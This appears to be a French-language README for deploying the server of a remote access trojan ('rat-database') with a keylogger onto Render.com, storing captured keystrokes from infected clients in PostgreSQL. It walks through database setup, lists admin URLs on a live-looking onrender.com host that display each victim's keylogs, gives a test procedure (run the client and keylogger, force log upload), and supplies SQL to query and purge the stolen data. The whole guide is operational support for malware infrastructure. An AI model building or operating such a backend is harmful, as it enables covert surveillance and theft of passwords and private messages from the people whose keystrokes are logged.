# 🚀 Déploiement sur Render.com avec PostgreSQL

## ✅ Ce qui a été fait

Le serveur supporte maintenant **deux modes** :
- 🏠 **Mode Local** : Sauvegarde dans `keylogs_backup.json`
- ☁️ **Mode Render** : Sauvegarde dans PostgreSQL (persistence permanente)

## 📋 Étapes de Configuration sur Render.com

### 1️⃣ Créer une Base de Données PostgreSQL

1. Allez sur [Render.com](https://render.com)
2. Cliquez sur **"New +"** → **"PostgreSQL"**
3. Configurez :
   - **Name** : `rat-database` (ou votre choix)
   - **Database** : `ratdb`
   - **User** : (généré automatiquement)
   - **Region** : Même région que votre serveur
   - **Plan** : **Free** ✅
4. Cliquez sur **"Create Database"**
5. **Copiez l'URL** interne : `postgres://user:pass@host/db`

### 2️⃣ Connecter la Database au Web Service

1. Allez dans votre **Web Service** (server-70ts)
2. Cliquez sur **"Environment"** dans le menu de gauche
3. Ajoutez une nouvelle variable d'environnement :
   - **Key** : `DATABASE_URL`
   - **Value** : Collez l'URL PostgreSQL copiée
4. Cliquez sur **"Save Changes"**

### 3️⃣ Redéployer le Serveur

1. Le serveur va redémarrer automatiquement
2. Vérifiez les logs :
   ```
   [DATABASE] Using PostgreSQL for persistence
   [DATABASE] ✅ Database initialized
   ```

### 4️⃣ Tester

1. Démarrez un client et le keylogger
2. Tapez quelques touches
3. Forcez l'upload des logs
4. Vérifiez : `https://server-70ts.onrender.com/admin/keylogs_all`
5. Vous devriez voir les keylogs ! ✅

## 🔍 Vérifications

### Logs à surveiller :
```
[DATABASE] Using PostgreSQL for persistence
[DATABASE] ✅ Database initialized
[DATABASE] ✅ Loaded X clients' keylogs
[DATABASE] ✅ Saved Y keylogs for client_id
```

### En cas d'erreur :
Si vous voyez :
```
[DATABASE] ⚠️ psycopg2 not installed, falling back to file storage
```
C'est que `psycopg2-binary` n'est pas installé. Vérifiez `requirements.txt`.

### URLs de test :
- Status : `https://server-70ts.onrender.com/admin/status`
- Tous les keylogs : `https://server-70ts.onrender.com/admin/keylogs_all`
- Stats : `https://server-70ts.onrender.com/admin/keylogs_stats`
- Keylogs d'un client : `https://server-70ts.onrender.com/admin/keylogs/<client_id>`

## 💡 Avantages de PostgreSQL

✅ **Persistence permanente** - Les données survivent aux redémarrages  
✅ **Gratuit sur Render** - Plan Free disponible  
✅ **Scalable** - Peut gérer des millions de keylogs  
✅ **Backup automatique** - Render fait des backups quotidiens  

## 🏠 Développement Local

En local, le serveur utilise automatiquement le fichier JSON :
```bash
python server.py
# [STORAGE] ✅ Loaded X clients' keylogs from keylogs_backup.json
```

## 🔧 Commandes Utiles

### Voir les keylogs dans la DB (via Render Dashboard) :
1. Allez dans votre PostgreSQL database
2. Cliquez sur "Shell" ou "Connect"
3. Exécutez :
```sql
SELECT * FROM keylogs LIMIT 10;
SELECT client_id, COUNT(*) FROM keylogs GROUP BY client_id;
```

### Nettoyer la DB :
```sql
DELETE FROM keylogs WHERE created_at < NOW() - INTERVAL '7 days';
```

## 📊 Structure de la Table

```sql
CREATE TABLE keylogs (
    id SERIAL PRIMARY KEY,
    client_id VARCHAR(255) NOT NULL,
    timestamp VARCHAR(100),
    text TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_client_id ON keylogs(client_id);
```

## 🎉 Résultat Final

Maintenant, vos keylogs sont **persistants** sur Render.com et **ne disparaissent plus** après un redémarrage ! 🚀
